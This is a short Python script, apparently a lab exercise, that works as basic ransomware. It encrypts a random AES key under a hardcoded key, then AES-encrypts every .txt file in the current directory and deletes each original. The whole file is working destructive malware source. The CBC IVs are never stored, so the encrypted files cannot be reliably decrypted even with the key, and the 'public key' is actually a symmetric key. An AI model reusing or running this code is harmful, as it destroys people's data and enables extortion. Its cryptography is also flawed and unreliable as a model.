import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# a.
pk = b'\xb1\x0f\xe8\x1ayY\x81zx\x87$"\x93\x9cI\x90'

# b.
sk = get_random_bytes(16)

#c.
def generate_encrypted_shared_key(public_key, shared_key):
    cipher = AES.new(public_key, AES.MODE_CBC)
    encrypted_shared_key = cipher.encrypt(pad((shared_key), AES.block_size))
    result_file = open("EncryptedSharedKey", "wb")
    result_file.write(encrypted_shared_key)
    result_file.close()
    return

# d.
def encrypt(file, shared_key):
    to_be_encrypted = open(file, "rb")
    to_be_encrypted_content = to_be_encrypted.read()
    to_be_encrypted.close()

    cipher = AES.new(shared_key, AES.MODE_CBC)
    encrypted_content = cipher.encrypt(pad(to_be_encrypted_content, AES.block_size))

    encrypted = open(f"{file}.encrypted", "wb")
    encrypted.write(encrypted_content)
    encrypted.close()

    os.remove(file)
    return encrypted



def encrypt_walk(shared_key):
    compromised_files = []
    current_folder = os.getcwd()
    dir = os.listdir(current_folder)
    for file in dir:
        path = os.path.join(current_folder, file)
        if os.path.isfile(path) and file.endswith(".txt"):
            print('y')
            try:
                compromised = encrypt(file, shared_key)
                compromised_files.append(compromised)
            except:
                print(f"An error occured encrypting file: {file}\n")

    return compromised_files


# run
generate_encrypted_shared_key(pk, sk)
sol = encrypt_walk(sk)
print(sol)
